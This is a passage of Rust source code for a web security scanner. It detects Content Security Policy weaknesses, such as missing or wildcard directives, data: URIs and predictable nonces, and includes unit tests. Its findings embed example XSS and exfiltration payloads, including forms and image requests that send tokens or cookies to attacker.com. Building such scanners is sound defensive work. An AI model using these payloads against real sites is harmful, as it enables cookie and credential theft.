                poc: Some("<form action='https://attacker.com/steal'><button type=submit>Click</button></form>".to_string()),
                affected_directive: "form-action".to_string(),
                cwe: "CWE-79".to_string(),
                remediation: "Add form-action 'self' to restrict form submissions to same origin.".to_string(),
            });
        } else if let Some(form_action) = csp.directives.get("form-action") {
            if form_action.has_wildcard {
                bypasses.push(CspBypass {
                    bypass_type: "Permissive form-action".to_string(),
                    severity: Severity::Medium,
                    description: "CSP form-action allows any origin, enabling data exfiltration via forms.".to_string(),
                    poc: Some("<form action='https://attacker.com/steal'><input name='token' value='secret'></form>".to_string()),
                    affected_directive: "form-action".to_string(),
                    cwe: "CWE-79".to_string(),
                    remediation: "Restrict form-action to trusted domains or 'self'.".to_string(),
                });
            }
        }

        (bypasses, tests)
    }

    /// Check for script gadgets in whitelisted libraries
    fn check_script_gadgets(
        &self,
        _url: &str,
        csp: &ParsedCsp,
        body: &str,
    ) -> (Vec<CspBypass>, usize) {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        // Check each known gadget
        for (library, indicator, payload) in KNOWN_SCRIPT_GADGETS {
            tests += 1;
            if body.contains(indicator) {
                // Check if the library's CDN is whitelisted
                let library_allowed = if let Some(script_src) = csp.get_script_sources() {
                    script_src.domains.iter().any(|d| {
                        d.contains("cdnjs") ||
                        d.contains("jsdelivr") ||
                        d.contains("unpkg") ||
                        d.contains("googleapis") ||
                        d.contains("*")
                    }) || script_src.has_wildcard
                } else {
                    false
                };

                if library_allowed {
                    bypasses.push(CspBypass {
                        bypass_type: format!("{} Script Gadget", library),
                        severity: Severity::High,
                        description: format!(
                            "Page includes {} which has known script gadgets. Combined with the \
                            permissive CSP, this can be exploited for XSS.",
                            library
                        ),
                        poc: Some(payload.to_string()),
                        affected_directive: "script-src".to_string(),
                        cwe: "CWE-79".to_string(),
                        remediation: format!(
                            "Update {} to latest version. Consider using strict-dynamic with nonces \
                            instead of domain whitelisting.",
                            library
                        ),
                    });
                }
            }
        }

        (bypasses, tests)
    }

    /// Check for missing critical directives
    fn check_missing_directives(&self, _url: &str, csp: &ParsedCsp) -> (Vec<CspBypass>, usize) {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        // object-src: Plugin-based attacks (Flash, Java)
        tests += 1;
        if !csp.has_object_src && !csp.has_default_src {
            bypasses.push(CspBypass {
                bypass_type: "Missing object-src Directive".to_string(),
                severity: Severity::Medium,
                description: "CSP does not restrict object-src (and no default-src fallback). \
                    Attackers may be able to embed Flash or other plugins for XSS.".to_string(),
                poc: Some("<object data='https://attacker.com/evil.swf'></object>".to_string()),
                affected_directive: "object-src".to_string(),
                cwe: "CWE-79".to_string(),
                remediation: "Add object-src 'none' to prevent plugin-based attacks.".to_string(),
            });
        }

        // script-src: No script restriction
        tests += 1;
        if !csp.has_script_src && !csp.has_default_src {
            bypasses.push(CspBypass {
                bypass_type: "Missing script-src Directive".to_string(),
                severity: Severity::High,
                description: "CSP does not include script-src or default-src. \
                    Scripts can be loaded from any origin.".to_string(),
                poc: Some("<script src='https://attacker.com/evil.js'></script>".to_string()),
                affected_directive: "script-src".to_string(),
                cwe: "CWE-79".to_string(),
                remediation: "Add script-src directive to restrict JavaScript sources.".to_string(),
            });
        }

        // Check if default-src is too permissive
        if csp.has_default_src {
            if let Some(default_src) = csp.directives.get("default-src") {
                tests += 1;
                if default_src.has_wildcard {
                    bypasses.push(CspBypass {
                        bypass_type: "Wildcard default-src".to_string(),
                        severity: Severity::High,
                        description: "CSP default-src contains '*'. This provides minimal protection \
                            as all resource types fall back to allowing any origin.".to_string(),
                        poc: None,
                        affected_directive: "default-src".to_string(),
                        cwe: "CWE-1021".to_string(),
                        remediation: "Set restrictive default-src (e.g., 'self') and explicitly \
                            allow necessary domains in specific directives.".to_string(),
                    });
                }
            }
        }

        (bypasses, tests)
    }

    /// Check for object-src bypass (Flash/plugin attacks)
    fn check_object_src_bypass(&self, _url: &str, csp: &ParsedCsp) -> (Vec<CspBypass>, usize) {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        if let Some(object_src) = csp.get_object_sources() {
            tests += 1;
            if object_src.has_wildcard || !object_src.values.contains(&"'none'".to_string()) {
                // Check for Flash CDN whitelisting
                let flash_cdns = ["cdn.jsdelivr.net", "cdnjs.cloudflare.com", "unpkg.com"];
                for domain in &object_src.domains {
                    for cdn in &flash_cdns {
                        if domain.contains(cdn) {
                            bypasses.push(CspBypass {
                                bypass_type: "Object-src Allows Flash CDN".to_string(),
                                severity: Severity::Medium,
                                description: format!(
                                    "CSP object-src allows {}. While Flash is deprecated, \
                                    some browsers may still support it for attacks.",
                                    cdn
                                ),
                                poc: Some(format!("<object data='https://{}/path/evil.swf'></object>", cdn)),
                                affected_directive: "object-src".to_string(),
                                cwe: "CWE-79".to_string(),
                                remediation: "Set object-src 'none' to block all plugins.".to_string(),
                            });
                            break;
                        }
                    }
                }
            }
        }

        (bypasses, tests)
    }

    /// Check for data: URI bypass
    fn check_data_uri_bypass(&self, _url: &str, csp: &ParsedCsp) -> (Vec<CspBypass>, usize) {
        let mut bypasses = Vec::new();
        let mut tests = 0;

        if let Some(script_src) = csp.get_script_sources() {
            tests += 1;
            let allows_data = script_src.values.iter().any(|v| v == "data:");

            if allows_data {
                bypasses.push(CspBypass {
                    bypass_type: "data: URI in script-src".to_string(),
                    severity: Severity::High,
                    description: "CSP script-src allows 'data:' URIs. Attackers can execute \
                        JavaScript via data URIs: <script src='data:text/javascript,alert(1)'></script>".to_string(),
                    poc: Some("<script src='data:text/javascript,alert(document.domain)'></script>".to_string()),
                    affected_directive: "script-src".to_string(),
                    cwe: "CWE-79".to_string(),
                    remediation: "Remove 'data:' from script-src. Use nonces or hashes for inline scripts.".to_string(),
                });
            }
        }

        // Check img-src for data: (less severe but can be used for exfiltration)
        if let Some(img_src) = csp.directives.get("img-src") {
            tests += 1;
            let allows_data = img_src.values.iter().any(|v| v == "data:");
            let allows_wildcard = img_src.has_wildcard;

            if allows_wildcard {
                bypasses.push(CspBypass {
                    bypass_type: "Wildcard img-src".to_string(),
                    severity: Severity::Low,
                    description: "CSP img-src allows any origin. While not directly exploitable \
                        for XSS, it can be used for data exfiltration via image requests.".to_string(),
                    poc: Some("<img src='https://attacker.com/log?data=' + document.cookie>".to_string()),
                    affected_directive: "img-src".to_string(),
                    cwe: "CWE-200".to_string(),
                    remediation: "Restrict img-src to trusted domains.".to_string(),
                });
            }
        }

        (bypasses, tests)
    }

    /// Check if a nonce appears to be predictable
    fn is_predictable_nonce(&self, nonce: &str) -> bool {
        // Check for common weak patterns
        let weak_patterns = [
            "0000", "1111", "1234", "abcd", "test", "nonce",
            "static", "fixed", "hard", "code",
        ];

        let nonce_lower = nonce.to_lowercase();
        for pattern in &weak_patterns {
            if nonce_lower.contains(pattern) {
                return true;
            }
        }

        // Check for sequential characters
        if nonce.chars().collect::<Vec<_>>().windows(4).any(|w| {
            let nums: Option<Vec<u32>> = w.iter().map(|c| c.to_digit(36)).collect();
            if let Some(nums) = nums {
                nums.windows(2).all(|n| n[1] == n[0] + 1 || n[1] == n[0])
            } else {
                false
            }
        }) {
            return true;
        }

        // Check if it's all the same character
        if nonce.chars().all(|c| c == nonce.chars().next().unwrap_or('x')) {
            return true;
        }

        // Check for timestamp-like patterns (could be predictable)
        if nonce.chars().all(|c| c.is_ascii_digit()) && nonce.len() >= 10 {
            return true; // Likely a timestamp
        }

        false
    }

    /// Create a vulnerability from a bypass finding
    fn create_vulnerability(&self, url: &str, bypass: CspBypass) -> Vulnerability {
        let cvss = match bypass.severity {
            Severity::Critical => 9.0,
            Severity::High => 7.5,
            Severity::Medium => 5.0,
            Severity::Low => 3.0,
            Severity::Info => 1.0,
        };

        let description = format!(
            "{}{}",
            bypass.description,
            bypass.poc.as_ref().map(|p| format!("\n\nProof of Concept: {}", p)).unwrap_or_default()
        );

        Vulnerability {
            id: format!("csp_bypass_{}", uuid::Uuid::new_v4()),
            vuln_type: format!("CSP Bypass: {}", bypass.bypass_type),
            severity: bypass.severity,
            confidence: Confidence::High,
            category: "Security Misconfiguration".to_string(),
            url: url.to_string(),
            parameter: None,
            payload: bypass.poc.unwrap_or_else(|| "N/A".to_string()),
            description,
            evidence: Some(format!("Affected directive: {}", bypass.affected_directive)),
            cwe: bypass.cwe,
            cvss,
            verified: true,
            false_positive: false,
            remediation: bypass.remediation,
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

/// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_basic_csp() {
        let csp = "default-src 'self'; script-src 'self' 'unsafe-inline'";
        let parsed = ParsedCsp::parse(csp, false);

        assert!(parsed.has_default_src);
        assert!(parsed.has_script_src);
        assert!(!parsed.is_report_only);

        let script_src = parsed.directives.get("script-src").unwrap();
        assert!(script_src.has_unsafe_inline);
        assert!(!script_src.has_unsafe_eval);
    }

    #[test]
    fn test_parse_nonce_csp() {
        let csp = "script-src 'nonce-abc123' 'strict-dynamic'";
        let parsed = ParsedCsp::parse(csp, false);

        let script_src = parsed.get_script_sources().unwrap();
        assert!(script_src.has_nonce);
        assert!(script_src.has_strict_dynamic);
        assert_eq!(script_src.nonces, vec!["abc123"]);
    }

    #[test]
    fn test_parse_hash_csp() {
        let csp = "script-src 'sha256-abc123' 'sha384-xyz789'";
        let parsed = ParsedCsp::parse(csp, false);

        let script_src = parsed.get_script_sources().unwrap();
        assert!(script_src.has_hash);
        assert_eq!(script_src.hashes.len(), 2);
    }

    #[test]
    fn test_parse_wildcard_csp() {
        let csp = "script-src * *.example.com";
        let parsed = ParsedCsp::parse(csp, false);

        let script_src = parsed.get_script_sources().unwrap();
        assert!(script_src.has_wildcard);
        assert!(script_src.domains.contains(&"*.example.com".to_string()));
    }

    #[test]
    fn test_predictable_nonce_detection() {
        let scanner = CspBypassScanner::new(Arc::new(
            crate::http_client::HttpClient::new(30, 3).unwrap()
        ));

        assert!(scanner.is_predictable_nonce("12345678"));
        assert!(scanner.is_predictable_nonce("aaaaaaaaaa"));
        assert!(scanner.is_predictable_nonce("test123abc"));
        assert!(scanner.is_predictable_nonce("1609459200000")); // Timestamp
        assert!(!scanner.is_predictable_nonce("a1b2c3d4e5f6g7h8")); // Random-looking
    }

    #[test]
    fn test_missing_directives_detection() {
        let scanner = CspBypassScanner::new(Arc::new(
            crate::http_client::HttpClient::new(30, 3).unwrap()
        ));

        // CSP with no object-src or default-src
        let csp = "script-src 'self'";
        let parsed = ParsedCsp::parse(csp, false);

        let (bypasses, _) = scanner.check_missing_directives("https://example.com", &parsed);
        assert!(!bypasses.is_empty());
        assert!(bypasses.iter().any(|b| b.bypass_type.contains("object-src")));
    }

    #[test]
    fn test_unsafe_inline_detection() {
        let scanner = CspBypassScanner::new(Arc::new(
            crate::http_client::HttpClient::new(30, 3).unwrap()
        ));

        let csp = "script-src 'self' 'unsafe-inline'";
        let parsed = ParsedCsp::parse(csp, false);

        let (bypasses, _) = scanner.check_unsafe_inline_bypass("https://example.com", &parsed);
        assert!(!bypasses.is_empty());
        assert!(bypasses.iter().any(|b| b.bypass_type.contains("unsafe-inline")));
    }

    #[test]
    fn test_strict_dynamic_mitigates_unsafe_inline() {
        let scanner = CspBypassScanner::new(Arc::new(
            crate::http_client::HttpClient::new(30, 3).unwrap()
        ));

        let csp = "script-src 'nonce-abc' 'strict-dynamic' 'unsafe-inline'";
        let parsed = ParsedCsp::parse(csp, false);

        let (bypasses, _) = scanner.check_unsafe_inline_bypass("https://example.com", &parsed);
        // strict-dynamic should mitigate unsafe-inline
        assert!(bypasses.is_empty() || bypasses.iter().all(|b| !b.bypass_type.contains("unsafe-inline")));
    }

    #[test]
    fn test_base_uri_bypass_detection() {
        let scanner = CspBypassScanner::new(Arc::new(
            crate::http_client::HttpClient::new(30, 3).unwrap()
        ));

        // CSP without base-uri
        let csp = "script-src 'self'; default-src 'self'";
        let parsed = ParsedCsp::parse(csp, false);

        let (bypasses, _) = scanner.check_base_uri_bypass("https://example.com", &parsed);
        assert!(!bypasses.is_empty());
        assert!(bypasses.iter().any(|b| b.bypass_type.contains("base-uri")));
    }

    #[test]
    fn test_data_uri_bypass_detection() {
        let scanner = CspBypassScanner::new(Arc::new(
            crate::http_client::HttpClient::new(30, 3).unwrap()
        ));

        let csp = "script-src 'self' data:";
        let parsed = ParsedCsp::parse(csp, false);

        let (bypasses, _) = scanner.check_data_uri_bypass("https://example.com", &parsed);
        assert!(!bypasses.is_empty());
        assert!(bypasses.iter().any(|b| b.bypass_type.contains("data:")));
    }

    #[test]
    fn test_angular_bypass_detection() {
        let scanner = CspBypassScanner::new(Arc::new(
            crate::http_client::HttpClient::new(30, 3).unwrap()
        ));

        let csp = "script-src 'self' cdnjs.cloudflare.com";
        let parsed = ParsedCsp::parse(csp, false);
        let body = "<html ng-app><body>{{1+1}}</body></html>";

        let (bypasses, _) = scanner.check_angular_bypass("https://example.com", &parsed, body);
        assert!(!bypasses.is_empty());
    }

    #[test]
    fn test_wildcard_cdn_detection() {
        let scanner = CspBypassScanner::new(Arc::new(
            crate::http_client::HttpClient::new(30, 3).unwrap()
        ));

        let csp = "script-src 'self' cdn.jsdelivr.net unpkg.com";
        let parsed = ParsedCsp::parse(csp, false);

        let (bypasses, _) = scanner.check_wildcard_bypass("https://example.com", &parsed);
        assert!(bypasses.len() >= 2); // Should detect both CDNs
    }
}
